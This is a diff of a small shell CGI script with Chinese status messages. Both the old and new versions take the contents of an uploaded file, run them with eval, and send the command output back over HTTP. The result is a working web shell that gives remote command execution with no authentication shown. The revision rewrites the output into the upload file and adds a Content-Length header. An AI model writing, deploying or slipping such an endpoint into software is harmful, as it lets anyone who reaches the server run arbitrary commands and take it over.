@@ -1,15 +1,11 @@
 #!/bin/sh
-printf "HTTP/1.1 200 OK\r\n"
-printf "Cache-Control: no-store\r\n"
-printf "Content-Type: text/plain; charset=utf-8\r\n\r\n"
-if [ -f "$UPLOAD_FILENAME" ]; then
-    CMD=$(cat "$UPLOAD_FILENAME")
-    if [ -n "$CMD" ]; then
-        echo "$CMD"
-        eval "$CMD" 2>&1
-    else
-        echo "/tmp/cgi*为空"
-    fi
-else
-    echo "未找到/tmp/cgi*"
-fi
+CMD=$(cat "$UPLOAD_FILENAME" | tr -d '\r')
+{
+  printf '%s\n' "$CMD"
+  eval "$CMD" 2>&1
+} > "$UPLOAD_FILENAME"
+len=$(wc -c < "$UPLOAD_FILENAME")
+printf 'Cache-Control: no-store\r\n'
+printf 'Content-Type: text/plain; charset=utf-8\r\n'
+printf 'Content-Length: %d\r\n\r\n' "$len"
+cat "$UPLOAD_FILENAME"
